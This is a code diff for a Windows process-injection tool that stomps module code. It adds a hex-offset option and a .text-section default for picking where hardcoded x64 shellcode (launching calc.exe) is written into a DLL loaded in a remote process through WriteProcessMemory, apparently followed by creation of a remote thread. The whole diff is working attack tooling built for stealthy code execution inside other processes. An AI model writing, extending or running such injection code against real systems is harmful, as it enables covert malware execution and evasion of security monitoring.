@@ -13,10 +13,11 @@
 #include "..\includes\utils.h"
 
 void PrintUsage(const char* programName) {
-    printf("[INFO] Usage: %s -p <PID> -d <Target_DLL> -f <Target_Function> [Options]\n", programName);
+    printf("[INFO] Usage: %s -p <PID> -d <Target_DLL> [-f <Target_Function> | -o <Hex_Offset>] [Options]\n", programName);
     printf("  -p : Target Process ID (PID)\n");
     printf("  -d : Name of the target DLL (e.g., wininet.dll)\n");
     printf("  -f : Name of the exported function to stomp (e.g., CommitUrlCacheEntryW)\n");
+    printf("  -o : Hexadecimal offset relative to the .text section start (e.g., 0x1A40 or 1A40)\n");
     printf("\nOptions:\n");
     printf("  -n : Enable NOP testing mode (ignores hardcoded shellcode)\n");
     printf("  -s : Number of NOP bytes to write (required if -n is used)\n");
@@ -43,12 +44,15 @@ int main(int argc, char *argv[]) {
         "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
         "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
         "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
-        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
+        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";     
 
     DWORD pid = 0;
     char* targetDll = NULL;
     char* targetFunction = NULL;
     
+    BOOL hasOffset = FALSE;
+    DWORD textOffset = 0;
+
     BOOL nopMode = FALSE;
     DWORD nopSize = 0;
 
@@ -63,6 +67,10 @@ int main(int argc, char *argv[]) {
             targetDll = argv[++i];
         } else if (strcmp(argv[i], "-f") == 0 && i + 1 < argc) {
             targetFunction = argv[++i];
+        } else if (strcmp(argv[i], "-o") == 0 && i + 1 < argc) {
+            hasOffset = TRUE;
+            // Parse the string as a hexadecimal value (handles both "0x1A" and "1A" format variants)
+            textOffset = (DWORD)strtoul(argv[++i], NULL, 16);
         } else if (strcmp(argv[i], "-n") == 0) {
             nopMode = TRUE;
         } else if (strcmp(argv[i], "-s") == 0 && i + 1 < argc) {
@@ -75,10 +83,22 @@ int main(int argc, char *argv[]) {
     }
 
     // Validate that all core fields were filled
-    if (pid == 0 || targetDll == NULL || targetFunction == NULL) {
-        printf("[ERROR] Missing required arguments!\n");
+    if (pid == 0 || targetDll == NULL) {
+        printf("[ERROR] Missing required arguments (PID and Target DLL are mandatory)!\n");
         PrintUsage(argv[0]);
         return -1;
+    }
+
+    // Enforce mutual exclusivity between function string naming and raw offset addressing
+    if (targetFunction != NULL && hasOffset) {
+        printf("[ERROR] Ambiguous targeting strategy! Specify a function export (-f) OR a text offset (-o), not both.\n");
+        PrintUsage(argv[0]);
+        return -1;
+    }
+
+    // Fallback if neither positioning parameter was supplied
+    if (targetFunction == NULL && !hasOffset) {
+        printf("[INFO] Neither function (-f) nor offset (-o) specified. Defaulting to base of .text section.\n");
     }
 
     // Validate NOP mode logic rules
@@ -122,7 +142,7 @@ int main(int argc, char *argv[]) {
         return -1;
     }
 
-    printf("[*] Target PEB located at: : 0x%016llx\n", remotePebAddr);
+    printf("[*] Target PEB located at: : 0x%016llx\n", (ULONG_PTR)remotePebAddr);
     
     PPEB peb_ptr = (PPEB)remotePebAddr;
 
@@ -135,25 +155,50 @@ int main(int argc, char *argv[]) {
         return -1;        
     }
 
-    printf("[*] Target DLL base located at: : 0x%016llx\n", targetModuleBase);
+    printf("[*] Target DLL base located at: : 0x%016llx\n", (ULONG_PTR)targetModuleBase);
 
-    LPVOID bufferAddress = (LPVOID)GetRemoteProcAddressManual(pHandle, targetModuleBase, targetFunction);  
-    if (bufferAddress == NULL) {
-        printf("[ERROR] Failed to locate target function %s! Error: %lu\n", targetFunction, GetLastError());
-        CloseHandle(pHandle);
-        if (nopMode) free(writeBuffer);
-        return -1;
+    LPVOID bufferAddress = NULL;
+
+    // Dynamic Export Lookup
+    if (targetFunction != NULL) {
+        printf("[*] Attempting to locate function: %s\n", targetFunction);
+        bufferAddress = (LPVOID)GetRemoteProcAddressManual(pHandle, targetModuleBase, targetFunction);  
+        if (bufferAddress == NULL) {
+            printf("[ERROR] Failed to locate target function %s! Error: %lu\n", targetFunction, GetLastError());
+            CloseHandle(pHandle);
+            if (nopMode) free(writeBuffer);
+            return -1;
+        }        
+        printf("[*] Target %s!%s located at: 0x%016llx\n", targetDll, targetFunction, (ULONG_PTR)bufferAddress);
+    }     
+    // Image-Base Relative RVA Positioning
+    else {
+        if (hasOffset) {
+            printf("[*] Applying RVA offset 0x%X directly from Image Base\n", textOffset);
+            bufferAddress = (LPVOID)((PBYTE)targetModuleBase + textOffset);
+        } else {
+            printf("[*] No function or offset specified. Locating absolute start of .text section.\n");
+            IMAGE_SECTION_INFO sectionInfo = { 0 };
+            if (GetRemoteModuleSection(pHandle, targetModuleBase, ".text", &sectionInfo)) {
+                bufferAddress = (LPVOID)((PBYTE)targetModuleBase + sectionInfo.VirtualAddress);
+            } else {
+                printf("[ERROR] Failed to locate .text section within the target module.\n");
+                CloseHandle(pHandle);
+                if (nopMode) free(writeBuffer);
+                return -1;
+            }
+        }        
+        
+        if (bufferAddress != NULL) {
+            printf("[*] Target address resolved to: 0x%016llx\n", (ULONG_PTR)bufferAddress);
+        }        
     }
-    printf("[*] Target %s!%s located at: 0x%016llx\n", targetDll, targetFunction, bufferAddress);
-
-    printf("[*] Press Enter to write the data to the buffer address: ");
-    getchar();
-
+    
     printf("[*] Writing to buffer.\n");
     // Write either the shellcode or the NOP payload to the target area
     BOOL writePayload = WriteProcessMemory(pHandle, bufferAddress, writeBuffer, writeSize, NULL);
-    if (writePayload == false) {
-        printf("[ERROR] Failed to write data! Using address: 0x%016llx, Error: %lu\n", bufferAddress, GetLastError());
+    if (writePayload == FALSE) {
+        printf("[ERROR] Failed to write data! Using address: 0x%016llx, Error: %lu\n", (ULONG_PTR)bufferAddress, GetLastError());
         CloseHandle(pHandle);
         if (nopMode) free(writeBuffer);
         return -1;
@@ -168,11 +213,6 @@ int main(int argc, char *argv[]) {
             CloseHandle(pHandle);
             return -1;
         }
-
-        /*
-        printf("[*] Waiting for the thread to return...\n");
-        WaitForSingleObject(tHandle, INFINITE);
-        */
         CloseHandle(tHandle);
     } else {
         printf("[*] Skipping thread creation (NOP testing mode complete).\n");
